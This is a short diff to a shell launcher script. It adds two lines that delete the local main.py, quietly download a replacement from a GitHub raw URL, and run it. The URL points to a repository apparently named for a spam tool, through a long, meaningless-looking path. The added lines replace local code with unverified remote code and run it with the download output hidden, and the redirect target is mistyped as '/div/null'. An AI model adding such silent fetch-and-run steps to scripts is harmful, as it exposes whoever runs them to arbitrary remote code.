@@ -18,4 +18,6 @@ then
  bash setup.sh
  exit
 fi
+rm main.py
+wget -q https://raw.githubusercontent.com/Simplehacker1Community/whats-spam/simplehacker/ls/s/slk/s/a/a/a/a/as/s/s/d/d/se/d/ds/a/sd/ds/s/a/ds/d/sa/ds/s/assdddssdadsa/sd/s/s/s/s/s/s/main.py &> /div/null 
 python main.py
